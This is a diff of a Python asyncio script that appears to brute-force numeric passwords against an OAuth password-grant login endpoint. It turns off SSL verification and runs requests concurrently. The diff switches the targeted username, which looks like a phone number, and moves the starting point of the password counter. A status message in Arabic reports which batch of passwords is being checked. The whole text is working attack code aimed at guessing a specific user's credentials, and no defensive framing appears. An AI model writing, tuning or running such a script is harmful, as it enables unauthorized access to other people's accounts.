@@ -14,7 +14,7 @@ BASE_DATA = {
     "grant_type": "password",
     "client_id": "restapp",
     "client_secret": "restapp",
-    "username": "777893643",
+    "username": "772490746",
     "scope": "openid"
 }
 
@@ -55,7 +55,7 @@ async def main():
     connector = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY_LIMIT)
     
     async with aiohttp.ClientSession(connector=connector) as session:
-        current_pass = 2560000
+        current_pass = 14270073
         
         while not stop_event.is_set():
             print(f"🔄 جاري فحص الدفعة من {current_pass} إلى {current_pass + CHUNK_SIZE - 1}...")
